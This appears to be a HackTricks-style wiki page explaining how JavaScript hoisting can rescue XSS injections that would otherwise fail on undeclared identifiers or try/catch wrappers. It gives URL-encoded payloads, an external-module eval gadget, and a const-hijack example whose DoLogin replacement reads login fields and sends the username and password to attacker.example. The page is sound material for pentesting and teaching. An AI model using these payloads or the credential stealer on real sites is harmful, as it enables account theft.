# JS Hoisting

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

**Hoisting** is a common shorthand for the observable behavior by which JavaScript bindings are created during scope instantiation before evaluation reaches their declaration. The source text is not literally moved, and the behavior differs for function declarations, `var`, lexical declarations (`let`, `const`, and `class`), and static imports.<sup>[[2]](#references)</sup>

The engine parses a script or module before evaluating it and creates its bindings as part of declaration instantiation. A syntax error prevents evaluation entirely; hoisting gadgets instead help with **runtime** failures such as an otherwise undeclared identifier.

It is crucial to understand that:

1. The script must be free of syntax errors for execution to occur. Syntax rules must be strictly adhered to.
2. The placement of code within the script affects execution due to hoisting, although the executed code might differ from its textual representation.

#### Types of Hoisting

Based on the information from MDN, there are four distinct types of hoisting in JavaScript:<sup>[[2]](#references)</sup>

1. **Value Hoisting**: Enables the use of a variable's value within its scope before its declaration line.
2. **Declaration Hoisting**: Allows referencing a variable within its scope before its declaration without causing a `ReferenceError`, but the variable's value will be `undefined`.
3. This type alters the behavior within its scope due to the variable's declaration before its actual declaration line.
4. The declaration's side effects occur before the rest of the code containing it is evaluated.

In detail, function declarations exhibit type 1 hoisting behavior. The `var` keyword demonstrates type 2 behavior. Lexical declarations, which include `let`, `const`, and `class`, show type 3 behavior. Lastly, `import` statements are unique in that they are hoisted with both type 1 and type 4 behaviors.

## Scenarios

Therefore, if you can inject JavaScript after code that uses an undeclared identifier, a hoisted declaration can prevent the early `ReferenceError` and allow the injected expression to execute:<sup>[[1]](#references)</sup>

```javascript
// The function vulnerableFunction is not defined
vulnerableFunction('test', '<INJECTION>');
// You can define it in your injection to execute JS
//Payload1: param='-alert(1)-'')%3b+function+vulnerableFunction(a,b){return+1}%3b
'-alert(1)-''); function vulnerableFunction(a,b){return 1};

//Payload2: param=test')%3bfunction+vulnerableFunction(a,b){return+1}%3balert(1)
test'); function vulnerableFunction(a,b){ return 1 };alert(1)
```

```javascript
// If a variable is not defined, you could define it in the injection
// In the following example var a is not defined
function myFunction(a,b){
    return 1
};
myFunction(a, '<INJECTION>')

//Payload: param=test')%3b+var+a+%3d+1%3b+alert(1)%3b
test'); var a = 1; alert(1);
```

```javascript
// If an undeclared class is used, you cannot declare it AFTER being used
var variable = new unexploitableClass();
<INJECTION>
// But you can actually declare it as a function, being able to fix the syntax with something like:
function unexploitableClass() {
    return 1;
}
alert(1);
```

```javascript
// Properties are not hoisted
// So the following examples where the 'cookie' attribute doesn´t exist
// cannot be fixed if you can only inject after that code:
test.cookie("leo", "INJECTION")
test[("cookie", "injection")]
```

## More Scenarios

```javascript
// Undeclared var accessing to an undeclared method
x.y(1,INJECTION)
// You can inject
alert(1));function x(){}//
// And execute the allert with (the alert is resolved before it's detected that the "y" is undefined
x.y(1,alert(1));function x(){}//)
```

```javascript
// Undeclared var accessing 2 nested undeclared method
x.y.z(1,INJECTION)
// You can inject
");import {x} from "https://example.com/module.js"//
// It will be executed
x.y.z("alert(1)");import {x} from "https://example.com/module.js"//")


// The imported module:
// module.js
var x = {
  y: {
    z: function(param) {
      eval(param);
    }
  }
};

export { x };
```

```javascript
// In this final scenario from https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/
// It was injected the: let config;`-alert(1)`//`
// With the goal of making in the block the var config be empty, so the return is not executed
// And the same injection was replicated in the body URL to execute an alert

try {
  if (config) {
    return
  }
  // TODO handle missing config for: https://try-to-catch.glitch.me/"+`
  let config
  ;`-alert(1)` //`+"
} catch {
  fetch("/error", {
    method: "POST",
    body: {
      url:
        "https://try-to-catch.glitch.me/" +
        `
let config;` -
        alert(1) -
        `//` +
        "",
    },
  })
}
trigger()
```

<sup>[[3]](#references)</sup>

### Hoisting to bypass exception handling

When the sink is wrapped in a `try { x.y(...) } catch { ... }`, **ReferenceError** will stop execution before your payload runs. You can pre-declare the missing identifier so the call survives and your injected expression executes first:

```javascript
// Original sink (x and y are undefined, but you control INJECT)
x.y(1,INJECT)

// Payload (ch4n3 2023) – hoist x so the call is parsed; use the first argument position for code exec
prompt()) ; function x(){} //
```

`function x(){}` is hoisted before evaluation, so the parser no longer throws on `x.y(...)`; `prompt()` executes before `y` is resolved, then a `TypeError` is thrown after your code has run.<sup>[[5]](#references)</sup>

### Preempt later declarations by locking a name with const

If you can execute before a top-level `function foo(){...}` is parsed, declaring a lexical binding with the same name (e.g., `const foo = ...`) will prevent the later function declaration from rebinding that identifier. This can be abused in RXSS to hijack critical handlers defined later in the page:<sup>[[4]](#references)</sup>

```javascript
// Malicious code runs first (e.g., earlier inline <script>)
const DoLogin = () => {
  const pwd  = Trim(FormInput.InputPassword.value)
  const user = Trim(FormInput.InputUtente.value)
  fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd))
}

// Later, the legitimate page tries to declare:
function DoLogin(){ /* ... */ } // cannot override the existing const binding
```

Notes
- This relies on execution order and global (top-level) scope.
- If your payload is executed inside `eval()`, remember that `const/let` inside `eval` are block-scoped and won’t create global bindings. Inject a new `<script>` element with the code to establish a true global `const`.

### Related import-time code execution (not a hoisting primitive)

Server-side rendered applications sometimes forward input into dynamic `import()` to lazy-load components. Dynamic `import()` is evaluated where the expression executes—it is **not hoisted** like a static import declaration. However, vulnerable instrumentation such as old `import-in-the-middle` releases generated wrapper modules from an insufficiently validated specifier, creating a separate path-traversal/RCE risk tracked as CVE-2023-38704.<sup>[[7]](#references)</sup>

### Tooling

Modern scanners started to add explicit hoisting payloads. **KNOXSS v3.6.5** lists "JS Injection with Single Quotes Fixing ReferenceError - Object Hoisting" and "Hoisting Override" test cases; running it against RXSS contexts that throw `ReferenceError`/`TypeError` quickly surfaces hoist-based gadget candidates.<sup>[[6]](#references)</sup>

## References

- [1] [JavaScript Hoisting in XSS Scenarios](https://jlajara.gitlab.io/Javascript_Hoisting_in_XSS_Scenarios)
- [2] [MDN – Hoisting (Glossary)](https://developer.mozilla.org/en-US/docs/Glossary/Hoisting)
- [3] [Having some fun with JavaScript hoisting](https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/)
- [4] [From "Low-Impact" RXSS to Credential Stealer: A JS-in-JS Walkthrough](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)
- [5] [XSS Exception Bypass using Hoisting (ch4n3, 2023)](https://new-blog.ch4n3.kr/xss-exception-bypass-using-hoisting/)
- [6] [KNOXSS coverage – hoisting override cases](https://knoxss.pro/?page_id=766)
- [7] [NVD – CVE-2023-38704 (import-in-the-middle RCE)](https://nvd.nist.gov/vuln/detail/CVE-2023-38704)

{{#include ../../banners/hacktricks-training.md}}
